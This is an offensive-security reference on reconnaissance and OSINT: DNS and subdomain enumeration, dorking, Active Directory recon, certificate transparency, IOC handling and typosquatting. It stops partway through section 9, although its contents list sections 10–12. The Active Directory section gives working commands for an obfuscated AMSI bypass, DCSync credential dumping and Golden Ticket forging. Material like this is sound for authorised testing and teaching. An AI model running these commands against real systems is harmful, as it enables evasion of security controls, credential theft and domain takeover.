# Reconnaissance & OSINT Mastery — Offensive Security Reference

> **Synthesized from 15 Anthropic Cybersecurity Skills + security-org-reconnaissance**
> Last updated: 2026-07-09 | Classification: TLP:GREEN (internal use)

---

## Table of Contents

1. [Complete Recon Methodology (Passive vs Active)](#1-recon-methodology)
2. [Key Tools and Their Use Cases](#2-key-tools)
3. [DNS Enumeration Techniques](#3-dns-enumeration)
4. [Subdomain Discovery](#4-subdomain-discovery)
5. [OSINT Sources and Methods](#5-osint-sources)
6. [Active Directory Recon](#6-ad-recon)
7. [Certificate Transparency Exploitation](#7-cert-transparency)
8. [IOC Collection Methodology](#8-ioc-collection)
9. [Brand Monitoring & Typosquatting](#9-brand-monitoring)
10. [Recon Pipelines & Automation](#10-pipelines)
11. [Detection Signatures (Blue Team)](#11-detection)
12. [Common Pitfalls](#12-pitfalls)

---

## 1. Recon Methodology {#1-recon-methodology}

### 1.1 Passive vs Active Reconnaissance

| Dimension | Passive Recon | Active Recon |
|-----------|--------------|--------------|
| **Definition** | Collects info from public sources without touching target systems | Directly interacts with target infrastructure (scanning, probing) |
| **Footprint in target logs** | None | Visible (Nmap, HTTP requests, DNS queries to target servers) |
| **Legal risk** | Minimal (public data) | Requires written authorization |
| **Data richness** | Good — covers CT logs, WHOIS, social media, Shodan | Excellent — reveals live services, versions, misconfigs |
| **Tools** | Subfinder, Amass (passive), crt.sh, Shodan, SpiderFoot, OSINT Framework | Amass (active), Nmap, Gobuster, dnsrecon, httpx, Nuclei |
| **When to start** | Always — this is Phase 1 | Only after passive phase completes and scope is confirmed |

### 1.2 The 4-Phase Recon Methodology

**Phase 1 — Domain & Network Reconnaissance (Passive)**
1. WHOIS lookups via ARIN/RIPE → registrant, org, email, name servers
2. DNS record enumeration → NS, MX, TXT (SPF/DKIM/DMARC), SOA, SRV, CNAME
3. Zone transfer attempts (AXFR) against all name servers
4. Subdomain enumeration via CT logs, passive DNS, search engines
5. IP range and ASN mapping
6. Cloud storage bucket discovery (S3, Azure Blob, GCS)

**Phase 2 — Infrastructure & Service Discovery**
1. Shodan/Censys internet-wide scan queries (by IP, cert CN, org)
2. Technology fingerprinting → whatweb, Wappalyzer, BuiltWith
3. SSL/TLS analysis → sslyze, testssl.sh
4. WAF/CDN identification → wafw00f
5. Wayback Machine for removed pages and old endpoints
6. JavaScript file analysis for endpoints, API keys, internal hostnames

**Phase 3 — Personnel & Social Intelligence**
1. Employee enumeration via LinkedIn, company site, conference speakers
2. Email format identification (first.last, flast, firstl)
3. Organizational hierarchy mapping
4. Social media profiling (personal accounts, badge photos, office layouts)
5. Job posting analysis for technology stack and tool mentions
6. Conference presentations and technical publications

**Phase 4 — Credential & Data Leak Discovery**
1. Breach database checks (Have I Been Pwned, DeHashed)
2. Paste site monitoring (Pastebin, GitHub Gists)
3. GitHub/GitLab secret scanning (trufflehog, gitleaks, GitDorker)
4. Exposed configuration files and backups
5. Document metadata extraction (exiftool)
6. Google dorking for internal docs, admin panels, directory listings

### 1.3 MITRE ATT&CK Mapping

| Technique ID | Name | Phase |
|---|---|---|
| T1595.001 | Active Scanning: Scanning IP Blocks | Active recon |
| T1595.002 | Active Scanning: Vulnerability Scanning | Active recon |
| T1592 | Gather Victim Host Information | Passive recon |
| T1589 | Gather Victim Identity Information | Social/OSINT |
| T1590 | Gather Victim Network Information | Passive recon |
| T1591 | Gather Victim Org Information | OSINT |
| T1593 | Search Open Websites/Domains | Passive recon |
| T1594 | Search Victim-Owned Websites | Passive recon |
| T1596 | Search Open Technical Databases | Passive recon |
| T1597 | Search Closed Sources | Dark web/leaks |
| T1598 | Phishing for Information | Social engineering |

### 1.4 OSINT Categories & Sources

| Category | Sources | Value |
|----------|---------|-------|
| Domain Intelligence | DNS records, WHOIS, CT logs, subdomain enumeration | Network attack surface |
| Personnel Intelligence | LinkedIn, social media, conference talks, publications | Social engineering targets |
| Credential Intelligence | Breach databases, paste sites, GitHub leaks | Valid credential discovery |
| Technology Intelligence | Job postings, Wappalyzer, Shodan, Censys | Vulnerability identification |
| Physical Intelligence | Google Maps, social media photos, Glassdoor | Physical access planning |
| Document Intelligence | SEC filings, public documents, metadata extraction | Org structure & process |

---

## 2. Key Tools and Their Use Cases {#2-key-tools}

### 2.1 Subdomain Enumeration Tools

| Tool | Type | Strengths | Weaknesses |
|------|------|-----------|------------|
| **Subfinder** | Passive | Fast, 40+ data sources, excellent API key support | No active DNS brute-forcing |
| **Amass** | Passive + Active | Most comprehensive, graph analysis, 40+ passive sources | Slower, resource-intensive |
| **Gobuster** (DNS mode) | Active | Fast brute-forcing, configurable threads | Wordlist-dependent, noisy |
| **dnsenum** | Passive + Active | Zone transfer + brute-force + reverse DNS | Older, less maintained |
| **dnsrecon** | Passive + Active | Comprehensive — zone transfer, brute-force, cache snooping | Verbose output |
| **crt.sh** | Passive | Free CT log queries, SQL interface | Rate-limited, no API key |

### 2.2 OSINT Frameworks

| Tool | Purpose | Access |
|------|---------|--------|
| **SpiderFoot** | 200+ modules, automated correlation, REST API | Open source (HX cloud optional) |
| **Maltego** | Graph-based link analysis, 50+ transforms | CE (free) / Commercial |
| **Recon-ng** | Modular Python framework, database backend | Open source |
| **theHarvester** | Email, subdomain, name harvesting from search engines | Open source |
| **OSINT Framework** | Curated directory of OSINT tools at osintframework.com | Web interface |
| **Photon** | Web crawler for OSINT extraction | Open source |

### 2.3 Network Intelligence Tools

| Tool | Purpose | Access |
|------|---------|--------|
| **Shodan** | Internet-wide device search, banners, vulns, SSL certs | API key (free tier available) |
| **Censys** | Internet asset discovery, TLS cert search | API key (free tier available) |
| **SecurityTrails** | Passive DNS history, WHOIS history, API | API key (paid) |
| **WhoXY** | WHOIS history and reverse WHOIS lookups | API key (paid) |
| **VirusTotal** | Multi-AV, sandbox, domain/IP reputation | API key (free tier available) |

### 2.4 AD Recon Tools

| Tool | Purpose | Platform |
|------|---------|----------|
| **BloodHound** (CE v5+) | AD graph analysis, attack path visualization | Docker (Linux) |
| **SharpHound** | AD data collection (users, groups, ACLs, sessions) | Windows (.NET/PowerShell) |
| **AzureHound** | Azure AD data collection for BloodHound | Cross-platform |
| **PowerView** | AD enumeration, ACL analysis, trust mapping | Windows (PowerShell) |
| **Rubeus** | Kerberos ticket operations, AS-REP roast, Kerberoast | Windows (.NET) |

### 2.5 IOC & Threat Intel Tools

| Tool | Purpose | Access |
|------|---------|--------|
| **MISP** | Threat intel sharing platform, IOC management | Self-hosted / cloud |
| **OpenCTI** | CTI platform, STIX 2.1 native | Self-hosted |
| **MalwareBazaar** | Malware hash repository, YARA associations | Free API (abuse.ch) |
| **AbuseIPDB** | IP reputation, abuse report history | API key (free tier) |
| **URLScan.io** | URL analysis, screenshots, DOM, network requests | Free API |
| **CyberChef** | Data transformation for IOC defanging/formatting | Web / self-hosted |

---

## 3. DNS Enumeration Techniques {#3-dns-enumeration}

### 3.1 Record Types and What They Reveal

| Record | What to Look For | Offensive Value |
|--------|-----------------|-----------------|
| **NS** | Name servers → identify DNS hosting provider | Target DNS infrastructure |
| **MX** | Mail servers → identify email provider | Email attack surface |
| **TXT** | SPF, DKIM, DMARC, verification tokens, API keys | Email spoofing potential, leaked secrets |
| **SOA** | Zone metadata, admin email, serial number | Zone info, admin contact |
| **SRV** | Service locations (LDAP, Kerberos, SIP) | Internal service mapping |
| **CNAME** | Alias records → reveal CDN, cloud services | Subdomain takeover targets |
| **A/AAAA** | IP addresses | Infrastructure mapping |
| **PTR** | Reverse DNS → internal naming conventions | Server role identification |

### 3.2 Zone Transfer (AXFR) Attack

Zone transfers replicate the entire DNS zone file. If misconfigured, any client can request the full zone:

```bash
# Attempt AXFR against each name server
dig AXFR example.com @ns1.example.com
dig AXFR example.com @ns2.example.com

# Using host command
host -t axfr example.com ns1.example.com

# Automated with dnsrecon
dnsrecon -d example.com -t axfr

# If successful, save the complete zone file
dig AXFR example.com @ns2.example.com > zone_transfer_results.txt
```

**What a successful zone transfer reveals:** ALL DNS records including internal hostnames, staging/dev environments, internal IPs (RFC1918), mail servers, VPN endpoints, and administrative contacts.

### 3.3 DNS Security Checks

```bash
# Check DNSSEC validation
dig example.com +dnssec +short
dig DNSKEY example.com +short

# Check for open recursive resolver (misconfiguration)
dig @ns1.example.com google.com +recurse
# If it resolves → server is an open resolver (amplification risk)

# Check for wildcard DNS records
dig nonexistent-subdomain-xyz123.example.com +short
# If it resolves → wildcard exists (affects enumeration accuracy)

# Check SPF for overly permissive policy
dig TXT example.com +short | grep "v=spf1"
# +all or ?all = weak; -all = strong

# Check DMARC policy
dig TXT _dmarc.example.com +short
# p=none = no enforcement, p=quarantine/reject = enforced

# Check DKIM selectors (try common ones)
dig TXT default._domainkey.example.com +short
dig TXT selector1._domainkey.example.com +short
dig TXT google._domainkey.example.com +short
```

### 3.4 Reverse DNS Enumeration

```bash
# Reverse DNS on discovered IP ranges
dnsrecon -d example.com -t rvl -r 10.10.0.0/24

# Manual PTR record scan
for ip in $(seq 1 254); do
  result=$(dig -x 10.10.1.$ip +short 2>/dev/null)
  [ -n "$result" ] && echo "10.10.1.$ip -> $result"
done

# Nmap reverse DNS on subnet
nmap -sL 10.10.0.0/24 | grep "(" | awk '{print $5, $6}'
```

### 3.5 DNS Cache Snooping

```bash
# Check if DNS server has cached specific domains (info leakage)
dig @ns1.example.com www.competitor.com +norecurse
# Response reveals internal browsing activity
```

### 3.6 Critical DNS Findings Checklist

- [ ] Zone transfer allowed (HIGH — full zone exposure)
- [ ] Internal IPs leaked via DNS (RFC1918 in A records)
- [ ] Open recursive resolver (amplification/DOS risk)
- [ ] Missing DMARC policy (email spoofing)
- [ ] Weak SPF record (~all or ?all)
- [ ] Wildcard DNS record present (masks enumeration results)
- [ ] No DNSSEC (cache poisoning risk)
- [ ] DKIM selectors exposed

---

## 4. Subdomain Discovery {#4-subdomain-discovery}

### 4.1 Multi-Source Enumeration Strategy

**Never rely on a single tool.** Each tool queries different data sources. Combine results:

```bash
# 1. Passive enumeration (no packets to target)
subfinder -d example.com -all -o subfinder_results.txt

# 2. Amass passive (40+ data sources)
amass enum -passive -d example.com -o amass_passive.txt

# 3. Certificate Transparency logs
curl -s "https://crt.sh/?q=%25.example.com&output=json" | \
  jq -r '.[].name_value' | sort -u > ct_subdomains.txt

# 4. Active brute-force (sends DNS queries to target)
gobuster dns -d example.com \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
  -t 50 -o gobuster_dns.txt

# 5. Combine and deduplicate
cat subfinder_results.txt amass_passive.txt ct_subdomains.txt gobuster_dns.txt | \
  sort -u > all_subdomains.txt
```

### 4.2 Subfinder Configuration & Advanced Usage

```bash
# Install
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest

# Configure API keys for maximum coverage
cat > ~/.config/subfinder/provider-config.yaml << 'EOF'
shodan:
  - YOUR_SHODAN_API_KEY
censys:
  - YOUR_CENSYS_API_ID:YOUR_CENSYS_API_SECRET
virustotal:
  - YOUR_VT_API_KEY
securitytrails:
  - YOUR_ST_API_KEY
chaos:
  - YOUR_CHAOS_API_KEY
EOF

# Use specific sources
subfinder -d example.com -s crtsh,virustotal,shodan

# Rate limit to avoid throttling
subfinder -d example.com -rate-limit 10 -t 5

# Recursive enumeration (subdomains of subdomains)
subfinder -d example.com -recursive

# Pattern matching
subfinder -d example.com -m "api,dev,staging"

# Silent mode for piping
subfinder -d example.com -silent | httpx -silent -status-code
```

### 4.3 Validation Pipeline

After enumeration, validate live hosts and fingerprint services:

```bash
# Resolve all subdomains
cat all_subdomains.txt | dnsx -a -resp -o resolved.txt

# HTTP probe with technology detection
cat all_subdomains.txt | httpx -title -status-code -tech-detect -o live_hosts.txt

# Check common non-standard ports
cat all_subdomains.txt | httpx -ports 80,443,8080,8443,8000,3000 -o web_services.txt

# Screenshot for documentation
cat all_subdomains.txt | httpx -silent | gowitness file -f - -P screenshots/

# Chain with vulnerability scanning
subfinder -d example.com -silent | httpx -silent | nuclei -t cves/ -o vulns.txt
```

### 4.4 Identifying High-Value Targets

| Subdomain Pattern | Offensive Value |
|-------------------|-----------------|
| `staging.*`, `dev.*`, `test.*` | May have weaker security controls, default creds |
| `vpn.*`, `remote.*`, `gateway.*` | Entry points for lateral movement |
| `jenkins.*`, `gitlab.*`, `ci.*` | CI/CD → supply chain attacks |
| `admin.*`, `portal.*`, `internal.*` | Management interfaces |
| `*.s3.amazonaws.com`, `*.blob.core.windows.net` | Cloud storage — check for public access |
| `*.cloudfront.net`, `*.herokuapp.com` | CDN/PaaS — potential subdomain takeover |
| `*.ngrok.io`, `*.trycloudflare.com` | Developer tunnels — potential takeover |
| `mail.*`, `smtp.*`, `owa.*` | Email infrastructure |

### 4.5 Subdomain Takeover Detection

```bash
# Check for dangling CNAME records (pointing to decommissioned services)
cat all_subdomains.txt | while read sub; do
  cname=$(dig +short CNAME "$sub" | head -1)
  if [ -n "$cname" ]; then
    echo "$sub -> CNAME: $cname"
  fi
done > cname_records.txt

# Known vulnerable services:
# - *.herokuapp.com (heroku)
# - *.s3.amazonaws.com (AWS S3)
# - *.azurewebsites.net (Azure)
# - *.github.io (GitHub Pages)
# - *.shopify.com (Shopify)
# - *.surge.sh (Surge)
# - *.bitbucket.io (Bitbucket)
# - *.zendesk.com (Zendesk)
# - *.pantheon.io (Pantheon)
# - *.ghost.io (Ghost)
```

---

## 5. OSINT Sources and Methods {#5-osint-sources}

### 5.1 OSINT Framework Layers

```
┌─────────────────────────────────────────────────────────┐
│                    OSINT LAYER MODEL                      │
├─────────────────────────────────────────────────────────┤
│ Layer 1: Search Engines                                  │
│   Google Dorking, Bing, Yandex, DuckDuckGo              │
├─────────────────────────────────────────────────────────┤
│ Layer 2: Social Media                                    │
│   LinkedIn, Twitter/X, GitHub, Reddit, Facebook         │
├─────────────────────────────────────────────────────────┤
│ Layer 3: Public Databases                                │
│   WHOIS, DNS, CT logs, Shodan, Censys, AbuseDB          │
├─────────────────────────────────────────────────────────┤
│ Layer 4: Code Repositories                               │
│   GitHub/GitLab/Bitbucket secret scanning               │
├─────────────────────────────────────────────────────────┤
│ Layer 5: Breach & Leak Data                              │
│   HIBP, DeHashed, paste sites, dark web forums          │
├─────────────────────────────────────────────────────────┤
│ Layer 6: Documents & Metadata                            │
│   SEC filings, PDF metadata, job postings, resumes      │
└─────────────────────────────────────────────────────────┘
```

### 5.2 Google Dorking Operators

| Operator | Purpose | Example |
|----------|---------|---------|
| `site:` | Restrict to domain | `site:target.com filetype:pdf` |
| `filetype:` | Find specific file types | `site:target.com filetype:xlsx` |
| `inurl:` | URL contains string | `site:target.com inurl:admin` |
| `intitle:` | Page title contains | `intitle:"index of /"` |
| `intext:` | Body text contains | `site:target.com intext:"password"` |
| `" "` | Exact phrase match | `"target.com" "password"` |
| `OR` | Boolean OR | `site:pastebin.com "target.com"` |
| `-` | Exclude term | `site:target.com -www` |
| `cache:` | Google's cached version | `cache:target.com` |

**Powerful dork combinations:**
```
site:target.com filetype:pdf                    # Public documents
site:target.com inurl:admin                     # Admin panels
site:target.com intitle:"index of /"            # Directory listings
site:pastebin.com "target.com"                  # Paste site mentions
site:github.com "target.com" password           # GitHub credential leaks
site:target.com inurl:login OR inurl:portal     # Login pages
site:target.com filetype:env OR filetype:bak     # Config/backup files
```

### 5.3 GitHub OSINT

```bash
# Search for leaked secrets
# Manual search operators:
# org:target "password"
# org:target "api_key"
# org:target "secret"
# org:target "AWS_ACCESS_KEY"

# Automated secret scanning
trufflehog github --org=target-org --json > github_secrets.json
gitleaks detect --source . --report-format json > gitleaks_report.json

# GitHub API search
curl -s "https://api.github.com/search/code?q=org:target+password+extension:env" \
  -H "Authorization: token YOUR_GITHUB_TOKEN"
```

### 5.4 SpiderFoot Automation

```bash
# CLI-based scan
python sf.py -s target.com -m sfp_shodan,sfp_virustotal,sfp_passivetotal \
  -o TF -R result.json

# REST API scan
curl -X POST http://localhost:5001/api/v1/scan \
  -H "Content-Type: application/json" \
  -d '{"scan_name": "target_recon", "scan_target": "target.com", "module_list": ["sfp_shodan"]}'
```

### 5.5 Pivoting Techniques

The key to effective OSINT is **pivoting** — using one data point to discover related infrastructure:

```
Domain → WHOIS email → All domains registered by that email
Domain → IP address → All domains on same IP (shared hosting)
Domain → SSL cert CN → All IPs using same certificate
Email → LinkedIn → Employee's other accounts
Employee → GitHub → Personal repos, code contributions
Employee → Conference talks → Technology mentions
ASN → All IP ranges → Broader infrastructure map
```

### 5.6 Security Organization Reconnaissance

When researching a CSIRT/CERT or security vendor for intelligence:

1. **Org Profile**: Mission, CNA status, FIRST membership, data-sharing policies (TLP)
2. **Tool Catalog**: Navigate projects/services → GitHub repos → API docs → open data
3. **Publications**: Track incident types, TTPs, sector coverage
4. **Research Vector Mapping**: For each tool → WHAT does it do? → HOW does it relate? → HOW to access it? → LIMITATIONS?

```bash
# GitHub repo metadata
curl -s "https://api.github.com/repos/ORG/REPO"

# Raw README content
curl -s "https://raw.githubusercontent.com/ORG/REPO/branch/README.md"

# Org-wide repo search by topic
curl -s "https://api.github.com/search/repositories?q=org:ORG+topic:TOPIC"
```

---

## 6. Active Directory Recon {#6-ad-recon}

### 6.1 BloodHound Data Collection

```powershell
# Full collection (Users, Groups, Computers, Sessions, ACLs, Trusts, GPOs)
.\SharpHound.exe -c All --outputdirectory C:\Temp --zipfilename bloodhound_data.zip

# Stealth mode — structure only (no session enumeration)
.\SharpHound.exe -c DCOnly --outputdirectory C:\Temp

# Loop collection for session coverage over time
.\SharpHound.exe -c Session --loop --loopduration 02:00:00 --loopinterval 00:05:00

# From C2 session (in-memory)
dotnet inline-execute /tools/SharpHound.exe -c All --memcache --outputdirectory C:\Temp

# PowerShell variant (with AMSI bypass if needed)
$t = 'System.Management.Automation.Am' + 'siUtils'
[Ref].Assembly.GetType($t).GetField(('am' + 'siInitFailed'),'NonPublic,Static').SetValue($null,$true)
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Temp -ZipFileName bh.zip

# Azure AD collection
azurehound list -t <tenant-id> --refresh-token <token> -o azure_data.json
```

### 6.2 BloodHound Attack Path Queries

```cypher
-- Shortest path from owned user to Domain Admin
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'}))
RETURN p

-- Kerberoastable users with path to DA
MATCH (u:User {hasspn:true})
MATCH p=shortestPath((u)-[*1..]->(g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'}))
RETURN p

-- AS-REP Roastable users
MATCH (u:User {dontreqpreauth:true}) RETURN u.name, u.displayname

-- Users with DCSync rights
MATCH p=(n1)-[:MemberOf|GetChanges*1..]->(u:Domain)
MATCH p2=(n1)-[:MemberOf|GetChangesAll*1..]->(u)
RETURN n1.name

-- Domain Users as local admin on computers
MATCH p=(m:Group {name:'DOMAIN USERS@CORP.LOCAL'})-[:AdminTo]->(c:Computer) RETURN p

-- Unconstrained delegation computers
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name

-- Constrained delegation abuse paths
MATCH (u) WHERE u.allowedtodelegate IS NOT NULL RETURN u.name, u.allowedtodelegate

-- GenericAll on other users (password reset path)
MATCH p=(u1:User)-[:GenericAll]->(u2:User) RETURN u1.name, u2.name

-- WriteDACL paths (ACL abuse)
MATCH p=(n)-[:WriteDacl]->(m) WHERE n<>m RETURN p LIMIT 50

-- Service accounts with admin access
MATCH (u:User {hasspn:true})-[:AdminTo]->(c:Computer) RETURN u.name, c.name
```

### 6.3 Common Attack Paths

| Path | Chain | Risk |
|------|-------|------|
| **Kerberoasting → DA** | Owned user → Kerberoast SVC → crack hash → SVC is admin on server → server has DA session → steal token | Critical |
| **ACL Abuse Chain** | Owned user → GenericAll on User2 → reset password → User2 in IT Admins → admin on DC → DA | Critical |
| **Unconstrained Delegation** | Owned user → admin on server (unconstrained delegation) → coerce DC auth (PetitPotam) → capture TGT → DCSync | Critical |
| **GPO Abuse** | Owned user → GenericWrite on GPO → modify GPO → scheduled task on OU computers → SYSTEM code execution | High |

### 6.4 DCSync Attack

DCSync impersonates a Domain Controller and uses MS-DRSR protocol to replicate password hashes:

```bash
# Using Impacket secretsdump.py (Linux)
secretsdump.py domain.local/admin:'Password123'@10.10.10.1

# Dump specific user (KRBTGT for Golden Ticket)
secretsdump.py -just-dc-user krbtgt domain.local/admin:'Password123'@10.10.10.1

# Dump only NTLM hashes
secretsdump.py -just-dc-ntlm domain.local/admin:'Password123'@10.10.10.1

# Using Mimikatz (Windows)
mimikatz.exe "lsadump::dcsync /domain:domain.local /user:krbtgt"
mimikatz.exe "lsadump::dcsync /domain:domain.local /all /csv"
```

### 6.5 Golden Ticket Creation

```bash
# Using Impacket ticketer.py
ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid S-1-5-21-XXXXXXXXXX \
  -domain domain.local administrator

export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass domain.local/administrator@DC01.domain.local
```

### 6.6 Critical Hashes to Extract

| Account | Purpose | Persistence Value |
|---------|---------|-------------------|
| **krbtgt** | Golden Ticket creation | Indefinite domain access |
| **Administrator** | Direct DA access | Immediate privileged access |
| **Service accounts** | Lateral movement | Service access across domain |
| **Computer accounts** | Silver Ticket creation | Service-level impersonation |

### 6.7 Key DCSync Detection Signatures

| Indicator | Detection Method |
|-----------|-----------------|
| DRSGetNCChanges RPC from non-DC IPs | Network monitoring for DRSUAPI traffic |
| Event 4662 with Replicating Directory Changes GUIDs | Windows Security Log on DC |
| Event 4624 with impossible SIDs or non-existent users | Logon event anomalies |
| ACL modifications on domain root object | Event 5136 (directory service changes) |
| Replication traffic volume spike | Network baseline deviation |

---

## 7. Certificate Transparency Exploitation {#7-cert-transparency}

### 7.1 Subdomain Enumeration from CT Logs

```python
import requests

def enumerate_subdomains_ct(domain):
    params = {"q": f"%.{domain}", "output": "json"}
    resp = requests.get("https://crt.sh", params=params, timeout=30)
    certs = resp.json()
    
    subdomains = set()
    for cert in certs:
        name_value = cert.get("name_value", "")
        for name in name_value.split("\n"):
            name = name.strip().lower()
            if name.endswith(f".{domain}") or name == domain:
                subdomains.add(name.lstrip("*."))
    
    return sorted(subdomains)
```

**Why CT logs are so valuable:** Every SSL/TLS certificate is logged publicly. Attackers (and defenders) can discover staging, VPN, internal, and development subdomains that were never meant to be public — simply because someone issued a certificate for them.

### 7.2 Phishing Detection via CT Monitoring

```python
import certstream
import Levenshtein

class CertstreamMonitor:
    def __init__(self, watched_domains, brand_keywords, threshold=0.8):
        self.watched = [d.lower() for d in watched_domains]
        self.keywords = [k.lower() for k in brand_keywords]
        self.threshold = threshold
        self.alerts = []

    def start(self, max_alerts=100):
        def callback(message, context):
            if message["message_type"] == "certificate_update":
                leaf = message["data"]["leaf_cert"]
                for domain in leaf.get("all_domains", []):
                    if self._is_suspicious(domain):
                        self.alerts.append({
                            "domain": domain,
                            "issuer": leaf.get("issuer", {}).get("O", ""),
                            "detected_at": datetime.now().isoformat(),
                        })
                        if len(self.alerts) >= max_alerts:
                            raise KeyboardInterrupt
        
        certstream.listen_for_events(callback, url="wss://certstream.calidog.io/")

    def _is_suspicious(self, domain):
        for watched in self.watched:
            base = watched.split(".")[0]
            if base in domain and domain != watched:
                return True
            sim = Levenshtein.ratio(base, domain.split(".")[0])
            if sim >= self.threshold:
                return True
        for kw in self.keywords:
            if kw in domain:
                return True
        return False
```

### 7.3 crt.sh Query Patterns

```bash
# All subdomains from CT logs
curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq '.[].name_value' | sort -u

# Exclude expired certificates
curl -s "https://crt.sh/?q=%.example.com&output=json&exclude=expired"

# Specific ID lookup
curl -s "https://crt.sh/?id=12345678"

# SQL query for advanced filtering
curl -s "https://crt.sh/?q=example.com&output=json" | jq '.[] | select(.issuer_name | contains("Let'\''s Encrypt"))'
```

### 7.4 CT Monitoring Defense (CAA Records)

Prevent unauthorized certificate issuance by deploying CAA DNS records:

```bash
# Only allow Let's Encrypt to issue certificates for your domain
example.com. IN CAA 0 issue "letsencrypt.org"

# Only allow DigiCert
example.com. IN CAA 0 issue "digicert.com"

# Restrict email notifications for issuance attempts
example.com. IN CAA 0 iodef "mailto:security@example.com"
```

---

## 8. IOC Collection Methodology {#8-ioc-collection}

### 8.1 IOC Categories

| Category | Examples | Source |
|----------|----------|--------|
| **Network** | IPs, domains, URLs, JA3/JA3S hashes, User-Agent strings, DNS patterns | Firewall, proxy, DNS logs |
| **Host** | File hashes (MD5/SHA-1/SHA-256), file paths, registry keys, scheduled tasks, mutexes, named pipes | EDR, memory, disk forensics |
| **Email** | Sender addresses, subject lines, attachment hashes, embedded URLs, header anomalies | Email gateway, mail server |
| **Behavioral** | Unusual login times, data access patterns, privilege escalation chains | SIEM, UEBA |

### 8.2 IOC Extraction from Evidence Sources

**From SIEM/Logs:**
```sql
-- Splunk: Extract unique destination IPs
index=firewall action=blocked | stats count by dest_ip | where count > 100

-- Splunk: Extract domains from DNS logs
index=dns query=*evil* | stats count by query
```

**From Memory Forensics:**
```bash
# Volatility: Network connections
vol -f memory.raw windows.netscan | grep ESTABLISHED

# Extract strings from suspicious process
vol -f memory.raw windows.memmap --pid 3847 --dump
strings -n 8 pid.3847.dmp | grep -E "(http|https)://"
```

**From Malware Sandbox:**
```
Sandbox Report IOC Extraction:
- Dropped files:      3 (hashes extracted)
- DNS queries:        update.evil[.]com, cdn.malware[.]net
- HTTP connections:   POST to https://185.220.101[.]42/gate.php
- Registry modified:  HKCU\...\Run\svcupdate
- Mutex created:      Global\MTX_0x1234ABCD
- Named pipe:         \\.\pipe\MSSE-1234-server
```

### 8.3 IOC Enrichment Pipeline

```python
import vt
import requests

def enrich_ioc(ioc, ioc_type, vt_key):
    """Multi-source IOC enrichment."""
    results = {}
    
    # VirusTotal
    client = vt.Client(vt_key)
    if ioc_type == "hash":
        obj = client.get_object(f"/files/{ioc}")
        results["vt_detections"] = obj.last_analysis_stats
    elif ioc_type == "domain":
        obj = client.get_object(f"/domains/{ioc}")
        results["vt_reputation"] = obj.reputation
    elif ioc_type == "ip":
        obj = client.get_object(f"/ip_addresses/{ioc}")
        results["vt_reputation"] = obj.reputation
    client.close()
    
    # AbuseIPDB (IP only)
    if ioc_type == "ip":
        resp = requests.get(
            "https://api.abuseipdb.com/api/v2/check",
            headers={"Key": "YOUR_KEY", "Accept": "application/json"},
            params={"ipAddress": ioc, "maxAgeInDays": 90}
        )
        data = resp.json()["data"]
        results["abuse_confidence"] = data["abuseConfidenceScore"]
        results["total_reports"] = data["totalReports"]
    
    # MalwareBazaar (hash only)
    if ioc_type == "hash":
        resp = requests.post("https://mb-api.abuse.ch/api/v1/",
            data={"query": "get_info", "hash": ioc})
        if resp.json()["query_status"] == "ok":
            results["malware_family"] = resp.json()["data"][0].get("signature")
    
    return results
```

### 8.4 IOC Confidence Scoring

| Score | Confidence Level | Criteria |
|-------|-----------------|----------|
| 90-100 | Confirmed Malicious | Multiple TI sources confirm, observed in active attack |
| 70-89 | Highly Suspicious | Single TI source confirms, behavioral analysis supports |
| 50-69 | Suspicious | Limited TI data, contextually suspicious |
| 30-49 | Unconfirmed | No TI matches, but anomalous in environment |
| 0-29 | Likely Benign | False positive indicators or legitimate infrastructure |

### 8.5 IOC Distribution and Blocking

| IOC Type | Blocking Target | TTL |
|----------|----------------|-----|
| IP address | Firewall/IPS blocklist | 30 days |
| Domain | DNS sinkhole, web proxy | 90 days |
| URL | Web proxy, email gateway | 30 days |
| File hash | EDR blocklist, AV signatures | 180 days |
| JA3 hash | Network IDS rules | 30 days |

### 8.6 STIX 2.1 Packaging

```json
{
  "type": "indicator",
  "spec_version": "2.1",
  "id": "indicator--a1b2c3d4-e5f6-7890-abcd-ef1234567890",
  "name": "Qakbot C2 Server IP",
  "indicator_types": ["malicious-activity"],
  "pattern": "[ipv4-addr:value = '185.220.101.42']",
  "pattern_type": "stix",
  "confidence": 95,
  "labels": ["c2", "qakbot"],
  "object_marking_refs": ["marking-definition--f88d31f6-486f-44da-b317-01333bde0b82"]
}
```

### 8.7 IOC Report Template

```
INDICATOR OF COMPROMISE REPORT
================================
Incident:     INC-2025-XXXX
Date:         YYYY-MM-DD
TLP:          AMBER

NETWORK INDICATORS
Type     | Value                    | Confidence | Context
---------|--------------------------|------------|--------
IPv4     | 185.220.101[.]42         | 95         | C2 server
Domain   | update.evil[.]com        | 95         | Staging domain
URL      | hxxps://evil[.]com/gate  | 95         | C2 check-in
JA3      | a0e9f5d64349fb13191bc7...| 80         | TLS fingerprint

HOST INDICATORS
Type     | Value                    | Confidence | Context
---------|--------------------------|------------|--------
SHA-256  | a1b2c3d4e5f6...         | 100        | Malware dropper
FilePath | C:\Users\*\AppData\...   | 85         | Dropper location
RegKey   | HKCU\...\Run\svcupdate  | 90         | Persistence
Mutex    | Global\MTX_0x1234ABCD   | 95         | Instance lock

TOTAL: N indicators | HIGH confidence avg: XX
```

---

## 9. Brand Monitoring & Typosquatting {#9-brand-monitoring}

### 9.1 DNSTwist Domain Permutation Engine

```bash
# Basic scan — only registered domains
dnstwist --registered --format json --nameservers 8.8.8.8,1.1.1.1 \
  --threads 50 --mxcheck --ssdeep --geoip example.com

# Output includes:
# - domain name
# - fuzzer type (homoglyph, transposition, omission, etc.)
# - DNS A/AAAA records
# - MX records
# - WHOIS creation date
# - ssdeep similarity score
```

### 9.2 DNSTwist Fuzzer Types

| Fuzzer | Technique | Example (target: example.com) |
|--------|-----------|-------------------------------|
| **homoglyph** | Visually similar characters | `examp1e.com`, `exarnple.com` |
| **bitsquatting** | Bit-flip in domain name | `examp1e.com` |
| **transposition** | Swapped adjacent characters | `examlpe.com` |
| **omission** | Removed characters | `exmple.com` |
